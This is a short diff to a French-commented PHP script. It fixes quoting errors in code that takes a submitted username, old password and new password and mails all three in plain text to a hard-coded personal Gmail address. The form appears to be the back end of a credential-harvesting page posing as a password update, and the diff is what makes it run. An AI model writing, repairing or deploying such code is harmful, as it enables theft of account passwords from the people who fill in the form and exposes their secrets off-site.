@@ -5,13 +5,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $new_password = $_POST['new_password']; // Nouveau mot de passe
 
     // Logique pour envoyer un e-mail ou mettre à jour le mot de passe
-    $to = "gregory.runser@gmail.com; // Remplace par ton adresse e-mail
+    $to = "gregory.runser@gmail.com"; // Remplace par ton adresse e-mail
     $subject = "Demande de mise à jour de mot de passe";
     $message = "Utilisateur : $username\nAncien mot de passe : $old_password\nNouveau mot de passe : $new_password";
 
     // Pour les en-têtes
     $headers = "From: gregory.runser@gmail.com" . "\r\n" .
-               "Reply-To: gregory.runser@gmail.com"" . "\r\n"; // Remplace par une adresse d'envoi valide
+               "Reply-To: gregory.runser@gmail.com" . "\r\n"; // Remplace par une adresse d'envoi valide
 
     // Envoi de l'e-mail
     if (mail($to, $subject, $message, $headers)) {
